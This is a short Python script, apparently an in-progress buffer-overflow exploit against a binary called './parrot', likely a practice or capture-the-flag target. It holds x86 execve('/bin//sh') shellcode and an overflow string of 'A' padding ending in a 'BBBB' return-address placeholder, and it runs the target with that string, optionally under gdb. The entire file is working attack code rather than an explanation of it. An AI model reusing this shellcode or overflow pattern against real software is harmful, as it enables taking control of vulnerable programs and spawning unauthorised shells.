import os

DEBUG = True

exploit = "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x6a\x0b\x58\x99\xcd\x80"
exploit2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"

if DEBUG:
    argv = ["/usr/bin/gdb", "--args"]
else:
    argv = []

argv += ["./parrot", exploit2]

os.execv(argv[0], argv)
